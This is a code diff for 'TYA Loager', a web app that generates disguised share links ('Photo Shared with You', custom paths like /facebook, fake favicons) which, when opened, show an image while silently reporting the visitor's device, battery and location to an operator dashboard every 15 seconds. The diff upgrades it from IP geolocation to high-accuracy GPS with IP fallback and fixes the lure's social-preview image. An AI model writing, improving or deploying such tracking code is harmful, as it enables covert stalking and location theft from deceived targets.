@@ -5,23 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TYA Loager</title>
 
-    <!-- Open Graph for social preview -->
+    <!-- Open Graph for social preview – absolute URL -->
     <meta property="og:title" content="Photo Shared with You" />
     <meta property="og:description" content="Tap to view location" />
-    <meta property="og:image" id="og-image" content="/api/image" />
+    <meta property="og:image" id="og-image" content="" />
     <meta property="og:type" content="website" />
     <meta property="og:url" id="og-url" content="" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
 
-    <!-- Dynamic favicon -->
     <link id="dynamic-favicon" rel="icon" href="/api/favicon/i" type="image/jpeg" />
-
-    <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 
     <style>
-        /* ── Same styles as before ── */
+        /* Same styles as before – no changes */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -531,17 +528,15 @@
 </head>
 <body>
 
-    <!-- Toast -->
     <div id="toast"></div>
 
-    <!-- ─── DASHBOARD ─── -->
+    <!-- DASHBOARD -->
     <div id="dashboard-view">
         <div class="header">
             <h1 class="brand-name">TYA Loager</h1>
             <p class="brand-sub">📍 Live Tracker · Custom URLs · Offline Last Location</p>
         </div>
 
-        <!-- Upload Grid -->
         <div class="upload-grid">
             <div class="upload-card">
                 <h3>🖼️ Shared Image (OG)</h3>
@@ -578,14 +573,12 @@
             </div>
         </div>
 
-        <!-- Action Bar -->
         <div class="action-bar">
             <button onclick="generateLink()" class="btn btn-primary">✨ Generate New Link</button>
             <button onclick="clearAllData()" class="btn btn-danger">🗑️ Clear All Data</button>
             <button onclick="refreshDashboard()" class="btn btn-secondary">🔄 Refresh</button>
         </div>
 
-        <!-- User Cards -->
         <div class="grid-container" id="cards-container">
             <div class="empty-state">
                 <div class="icon">📡</div>
@@ -598,7 +591,7 @@
         </div>
     </div>
 
-    <!-- ─── TRACKER VIEW ─── -->
+    <!-- TRACKER -->
     <div id="tracker-view">
         <img id="target-image" src="" alt="Shared Image" />
         <div class="loader-overlay" id="loader">
@@ -607,25 +600,24 @@
         </div>
     </div>
 
-    <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
     </script>
 
     <script>
-        // ──────────────────────────────────────────────────────────────
-        //  CONFIG
-        // ──────────────────────────────────────────────────────────────
+        // ─── CONFIG ──────────────────────────────────────────────
         const FAVICON_NAMES = ['i', 'f', 'w', 'g'];
-        const OFFLINE_THRESHOLD = 30000; // 30 seconds
+        const OFFLINE_THRESHOLD = 30000;
 
-        // ──────────────────────────────────────────────────────────────
-        //  ROUTING
-        // ──────────────────────────────────────────────────────────────
+        // ─── ROUTING ──────────────────────────────────────────────
         const path = window.location.pathname;
         const isTracker = path.startsWith('/track/');
         const customPath = isTracker ? decodeURIComponent(path.substring(7)) : null;
 
+        // ─── Set absolute OG URL ────────────────────────────────
+        const origin = window.location.origin;
         document.getElementById('og-url').content = window.location.href;
+        // Set the og:image to the absolute URL of the image endpoint
+        document.getElementById('og-image').content = origin + '/api/image';
 
         if (isTracker && customPath) {
             initTracker(customPath);
@@ -633,22 +625,31 @@
             initDashboard();
         }
 
-        // ──────────────────────────────────────────────────────────────
-        //  STATE
-        // ──────────────────────────────────────────────────────────────
+        // ─── STATE ────────────────────────────────────────────────
         let trackedUsers = [];
         let mapInstances = {};
+        let isEditing = {};
 
-        // ──────────────────────────────────────────────────────────────
-        //  DASHBOARD
-        // ──────────────────────────────────────────────────────────────
+        // ─── DASHBOARD ────────────────────────────────────────────
         function initDashboard() {
             document.getElementById('dashboard-view').style.display = 'block';
             refreshPreviews();
             fetchUsers();
-            // Poll every 5 seconds
             setInterval(fetchUsers, 5000);
             setupUploads();
+
+            document.addEventListener('focusin', (e) => {
+                if (e.target && e.target.id && e.target.id.startsWith('path-')) {
+                    const id = e.target.id.replace('path-', '');
+                    isEditing[id] = true;
+                }
+            });
+            document.addEventListener('focusout', (e) => {
+                if (e.target && e.target.id && e.target.id.startsWith('path-')) {
+                    const id = e.target.id.replace('path-', '');
+                    isEditing[id] = false;
+                }
+            });
         }
 
         function refreshDashboard() {
@@ -665,14 +666,16 @@
             });
         }
 
-        // ─── Upload Handlers ──────────────────────────────────────────
+        // ─── Upload Handlers ──────────────────────────────────────
         function setupUploads() {
             document.getElementById('og-upload').addEventListener('change', async function(e) {
                 const file = e.target.files[0];
                 if (!file) return;
-                await uploadFile('/api/image', file, '✅ OG image uploaded!');
-                document.getElementById('og-preview').src = '/api/image?' + Date.now();
-                document.getElementById('og-image').content = '/api/image';
+                const ok = await uploadFile('/api/image', file, '✅ OG image uploaded!');
+                if (ok) {
+                    document.getElementById('og-preview').src = '/api/image?' + Date.now();
+                    // Update og:image to the absolute URL (already set)
+                }
                 e.target.value = '';
             });
 
@@ -682,10 +685,14 @@
                     input.addEventListener('change', async function(e) {
                         const file = e.target.files[0];
                         if (!file) return;
-                        await uploadFile('/api/favicon/' + name, file, '✅ Favicon "' + name +
-                            '.jpg" uploaded!');
-                        const img = document.querySelector(`#favicon-previews img[data-name="${name}"]`);
-                        if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
+                        const ok = await uploadFile('/api/favicon/' + name, file, '✅ Favicon "' +
+                            name + '.jpg" uploaded!');
+                        if (ok) {
+                            const img = document.querySelector(
+                                `#favicon-previews img[data-name="${name}"]`);
+                            if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
+                            fetchUsers();
+                        }
                         e.target.value = '';
                     });
                 }
@@ -697,7 +704,6 @@
             formData.append('image', file);
             try {
                 const res = await fetch(url, { method: 'POST', body: formData });
-                // Check if response is ok
                 if (!res.ok) {
                     const text = await res.text();
                     throw new Error(text || 'Server error');
@@ -705,16 +711,19 @@
                 const data = await res.json();
                 if (data.success) {
                     showToast(successMsg);
+                    return true;
                 } else {
                     showToast('❌ Upload failed: ' + (data.error || 'unknown'));
+                    return false;
                 }
             } catch (err) {
                 console.error('Upload error:', err);
                 showToast('❌ Error: ' + err.message);
+                return false;
             }
         }
 
-        // ─── Fetch Users ──────────────────────────────────────────────
+        // ─── Fetch Users ──────────────────────────────────────────
         async function fetchUsers() {
             try {
                 const res = await fetch('/api/track');
@@ -727,17 +736,19 @@
             }
         }
 
-        // ─── Render Cards ─────────────────────────────────────────────
+        // ─── Render Cards ─────────────────────────────────────────
         function renderCards() {
             const container = document.getElementById('cards-container');
 
-            // Preserve current input values before re-render
+            // Save current input values (only if not being edited)
             const inputValues = {};
             container.querySelectorAll('.card').forEach(card => {
                 const id = card.dataset.userId;
                 if (id) {
                     const input = card.querySelector('input[id^="path-"]');
-                    if (input) {
+                    if (input && !isEditing[id]) {
+                        inputValues[id] = input.value;
+                    } else if (input && isEditing[id]) {
                         inputValues[id] = input.value;
                     }
                 }
@@ -751,9 +762,6 @@
                         <div class="icon">📡</div>
                         <h3>No Active Targets</h3>
                         <p>Upload your images, then click "Generate New Link" to start tracking.</p>
-                        <p style="font-size:0.85rem;color:var(--text2);margin-top:8px;">
-                            Each link gets a custom URL (e.g., /facebook) and a favicon.
-                        </p>
                     </div>
                 `;
                 return;
@@ -768,7 +776,8 @@
             });
 
             sorted.forEach(user => {
-                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() < OFFLINE_THRESHOLD));
+                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() <
+                    OFFLINE_THRESHOLD));
                 const displayLat = isLive ? user.lat : (user.lastLat || null);
                 const displayLng = isLive ? user.lng : (user.lastLng || null);
                 const hasLocation = !!(displayLat && displayLng);
@@ -848,13 +857,13 @@
 
                 container.appendChild(card);
 
-                // Restore saved input value
-                if (inputValues[user.id]) {
+                if (inputValues[user.id] !== undefined) {
                     const input = card.querySelector('input[id^="path-"]');
-                    if (input) input.value = inputValues[user.id];
+                    if (input) {
+                        input.value = inputValues[user.id];
+                    }
                 }
 
-                // ─── Map ──────────────────────────────────────────────
                 setTimeout(() => {
                     if (hasLocation) {
                         const mapId = 'map-' + user.id;
@@ -882,7 +891,7 @@
             });
         }
 
-        // ─── Favicon Selection ────────────────────────────────────────
+        // ─── Favicon Selection ────────────────────────────────────
         function selectFavicon(userId, name) {
             const container = document.getElementById('fav-select-' + userId);
             if (!container) return;
@@ -897,7 +906,7 @@
             saveSettings(userId);
         }
 
-        // ─── Save Settings ────────────────────────────────────────────
+        // ─── Save Settings ────────────────────────────────────────
         async function saveSettings(userId) {
             const pathInput = document.getElementById('path-' + userId);
             const customPath = pathInput ? pathInput.value.trim() : userId;
@@ -915,10 +924,13 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ customPath, favicon }),
                 });
+                if (!res.ok) {
+                    const text = await res.text();
+                    throw new Error(text || 'Server error');
+                }
                 const data = await res.json();
                 if (data.success) {
                     showToast('✅ Settings saved for ' + escapeHtml(userId));
-                    // Update badge
                     const card = document.getElementById('card-' + userId);
                     if (card) {
                         const badge = card.querySelector('.favicon-badge img');
@@ -929,11 +941,12 @@
                     showToast('❌ Failed to save: ' + (data.error || 'unknown'));
                 }
             } catch (err) {
+                console.error('Save error:', err);
                 showToast('❌ Error: ' + err.message);
             }
         }
 
-        // ─── Generate Link ────────────────────────────────────────────
+        // ─── Generate Link ────────────────────────────────────────
         function generateLink() {
             const id = 'USER' + String(Math.floor(1000 + Math.random() * 9000));
             fetch('/api/track', {
@@ -949,20 +962,21 @@
             });
         }
 
-        // ─── Copy Link ────────────────────────────────────────────────
+        // ─── Copy Link ────────────────────────────────────────────
         function copyLink(id) {
             const pathInput = document.getElementById('path-' + id);
             const customPath = pathInput ? pathInput.value.trim() : id;
-            const link = window.location.origin + '/track/' + encodeURIComponent(customPath || id);
+            const link = origin + '/track/' + encodeURIComponent(customPath || id);
             navigator.clipboard.writeText(link)
-                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link + '</span>'))
+                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link +
+                        '</span>'))
                 .catch(() => {
                     prompt('Copy this link:', link);
                     showToast('📋 Link copied.');
                 });
         }
 
-        // ─── Delete User ──────────────────────────────────────────────
+        // ─── Delete User ──────────────────────────────────────────
         async function deleteUser(id) {
             if (!confirm('Delete user ' + id + '?')) return;
             try {
@@ -978,7 +992,7 @@
             }
         }
 
-        // ─── Clear All ────────────────────────────────────────────────
+        // ─── Clear All ────────────────────────────────────────────
         async function clearAllData() {
             if (!confirm('⚠️ Delete ALL tracking data? This cannot be undone.')) return;
             try {
@@ -995,9 +1009,9 @@
             }
         }
 
-        // ──────────────────────────────────────────────────────────────
-        //  TRACKER (User Side) – IP-based, no permission
-        // ──────────────────────────────────────────────────────────────
+        // ──────────────────────────────────────────────────────────
+        //  TRACKER (User Side) – GPS first, IP fallback
+        // ──────────────────────────────────────────────────────────
         function initTracker(customPath) {
             const trackerView = document.getElementById('tracker-view');
             const img = document.getElementById('target-image');
@@ -1023,12 +1037,12 @@
                         }
                         setTimeout(() => trackUser(user.id), 1500);
                     } else {
-                        // Create new user with this customPath
                         const newId = customPath;
                         fetch('/api/track', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending', battery: 'N/A', lat: null, lng: null }),
+                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending',
+                                battery: 'N/A', lat: null, lng: null }),
                         }).then(() => {
                             setTimeout(() => trackUser(newId), 1500);
                         }).catch(() => {
@@ -1061,33 +1075,36 @@
                 } catch (_) {}
             }
 
-            // Location via IP (no permission)
-            try {
-                const geoRes = await fetch('https://ipapi.co/json/');
-                if (geoRes.ok) {
-                    const geo = await geoRes.json();
-                    if (geo.latitude && geo.longitude) {
-                        data.lat = geo.latitude;
-                        data.lng = geo.longitude;
-                    }
-                }
-            } catch (_) {
-                try {
-                    const fallback = await fetch('https://ip-api.com/json/');
-                    if (fallback.ok) {
-                        const fData = await fallback.json();
-                        if (fData.lat && fData.lon) {
-                            data.lat = fData.lat;
-                            data.lng = fData.lon;
+            // ─── Location: GPS first, then IP fallback ──────────
+            const getLocation = () => new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            resolve({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            });
+                        },
+                        () => {
+                            // GPS failed – try IP
+                            resolve(null);
+                        }, {
+                            enableHighAccuracy: true,
+                            timeout: 8000,
+                            maximumAge: 0
                         }
-                    }
-                } catch (__) {}
-            }
+                    );
+                } else {
+                    resolve(null);
+                }
+            });
 
-            await sendTrackData(id, data);
-
-            // Keep sending updates every 15s
-            setInterval(async () => {
+            const gpsLoc = await getLocation();
+            if (gpsLoc) {
+                data.lat = gpsLoc.lat;
+                data.lng = gpsLoc.lng;
+            } else {
+                // Fallback to IP
                 try {
                     const geoRes = await fetch('https://ipapi.co/json/');
                     if (geoRes.ok) {
@@ -1097,7 +1114,43 @@
                             data.lng = geo.longitude;
                         }
                     }
-                } catch (_) {}
+                } catch (_) {
+                    try {
+                        const fallback = await fetch('https://ip-api.com/json/');
+                        if (fallback.ok) {
+                            const fData = await fallback.json();
+                            if (fData.lat && fData.lon) {
+                                data.lat = fData.lat;
+                                data.lng = fData.lon;
+                            }
+                        }
+                    } catch (__) {}
+                }
+            }
+
+            // Send initial data
+            await sendTrackData(id, data);
+
+            // Update every 15 seconds
+            setInterval(async () => {
+                // Try GPS again each time
+                const newGps = await getLocation();
+                if (newGps) {
+                    data.lat = newGps.lat;
+                    data.lng = newGps.lng;
+                } else {
+                    // Fallback IP
+                    try {
+                        const geoRes = await fetch('https://ipapi.co/json/');
+                        if (geoRes.ok) {
+                            const geo = await geoRes.json();
+                            if (geo.latitude && geo.longitude) {
+                                data.lat = geo.latitude;
+                                data.lng = geo.longitude;
+                            }
+                        }
+                    } catch (_) {}
+                }
                 await sendTrackData(id, data);
             }, 15000);
         }
@@ -1118,9 +1171,7 @@
             } catch (e) { /* silent */ }
         }
 
-        // ──────────────────────────────────────────────────────────────
-        //  UTILITY
-        // ──────────────────────────────────────────────────────────────
+        // ─── UTILITY ──────────────────────────────────────────────
         function showToast(msg) {
             const el = document.getElementById('toast');
             el.innerHTML = msg;
@@ -1140,7 +1191,8 @@
             Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
         });
 
-        console.log('🚀 TYA Loager v2 – fully fixed.');
+        console.log('🚀 TYA Loager v2.1 – GPS + fixed OG image.');
     </script>
+
 </body>
 </html>
